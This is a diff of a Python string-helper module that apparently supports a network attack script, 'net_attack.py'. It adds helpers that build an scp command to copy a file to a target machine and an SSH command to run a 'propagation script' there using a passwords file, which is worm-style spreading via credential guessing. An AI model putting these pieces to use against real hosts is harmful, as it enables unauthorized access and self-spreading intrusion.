@@ -7,7 +7,6 @@ function has a block comment explaining what it does and where it's used and
 every string constant has a comment describing its use.
 """
 
-
 ARGUMENT_IP_ADDRESS_FILENAME = "-t"
 ARGUMENT_PORTS = "-p"
 ARGUMENT_USERNAME = "-u"
@@ -28,6 +27,7 @@ LOOPBACK = "lo"
 MAIN = "main()"
 ONE = "1"
 PASSWORD_PROMPT = "Password:"
+PASSWORDS_FILE = "passwords.txt"
 PARAMETER_MISUSE = "Parameter misuse, check help text below"
 PERFORMING_LOCAL_SCAN = "Performing local scan, this might take a while so " \
                         "grab a coffee..."
@@ -71,15 +71,25 @@ def adding_address_to_interface(specific_address, interface):
            + str(interface) + "'s subnet."
 
 
+def cat_file(filename):
+    """
+    This function creates a command for concatenating a specific file
+    :param filename: The filename of the file we want to touch
+    :return command: The completed touch command
+    """
+    command = "cat " + filename
+    return command
+
+
 def connection_status(service, ip, port, status):
     """
     This function creates the connection status string dependent
     on the context given by the arguments passed into it.
     """
     string = str(status) + " " + str(service) + " login to " + str(ip) + ":" \
-        + str(port) \
-        + " using the specified username with a password in the passwords" \
-          " file."
+             + str(port) \
+             + " using the specified username with a password in the passwords" \
+               " file."
     return string
 
 
@@ -93,14 +103,18 @@ def fetching_ips_for_interface(interface):
     "Fetching IPs for interface " + str(interface) + "..."
 
 
-def scp_command_string(port, username, target_ip):
+def scp_command_string(port, username, target_ip, filename):
     """
     This function creates and SSH copy string for an OS command
     :param port: Port over which we are running the SSH copy
     :param username: The username for the SSH login
     :param target_ip: The IP address of the machine we are copying too
-    :return:
+    :param filename: The name of the file to be copied across by SSH
+    :return "scp -P " + str(port) + " " + filename + " " + username + "@" \
+           + target_ip + ":~/": The SSH copy command
     """
+    return "scp -P " + str(port) + " " + filename + " " + username + "@" \
+           + target_ip + ":~/"
 
 
 def touch_file(filename):
@@ -110,16 +124,6 @@ def touch_file(filename):
     :return command: The completed touch command
     """
     command = "touch " + filename
-    return command
-
-
-def cat_file(filename):
-    """
-    This function creates a command for concatenating a specific file
-    :param filename: The filename of the file we want to touch
-    :return command: The completed touch command
-    """
-    command = "cat " + filename
     return command
 
 
@@ -149,3 +153,15 @@ def ip_reachability(ip, reachable):
         return str(ip) + " was reachable."
     return str(ip) + " was not reachable."
 
+
+def ssh_run_script_command(filename, username):
+    """
+    This function will run the propagation script on another target machine
+    over SSH
+    :param filename: The file that holds the propagation script
+    :param username: The username to run against the propagation script as a
+    parameter
+    :return "net_attack.py -L -p 22,23 -u " + username + " -f passwords.txt
+    -P": The command itself
+    """
+    return filename + " -L -p 22,23 -u " + username + " -f passwords.txt -P"
